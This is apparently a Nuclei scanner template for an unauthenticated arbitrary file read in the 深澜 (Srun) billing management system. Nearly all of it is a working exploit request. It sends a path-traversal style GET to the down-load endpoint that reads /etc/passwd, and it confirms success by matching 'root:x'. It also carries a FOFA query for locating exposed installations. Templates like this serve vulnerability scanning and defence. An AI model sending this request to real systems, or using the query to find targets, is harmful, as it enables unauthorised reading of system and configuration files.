http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - root:x
            - /bin/bash
        - status:
            - 302
          type: status
      matchers-condition: and
      raw:
        - |
          GET /user/group/down-load?file=/etc/passwd HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
id: shenlan-down-load-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="/js/lib/slimscroll.js"
         深澜计费管理系统 down-load接口处存在任意文件读取漏洞，未经身份验证的攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 深澜计费管理系统 down-load 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/QQXm3sf6OuX9nyze6KcJfQ
    severity: high
    tags:
        - File reading
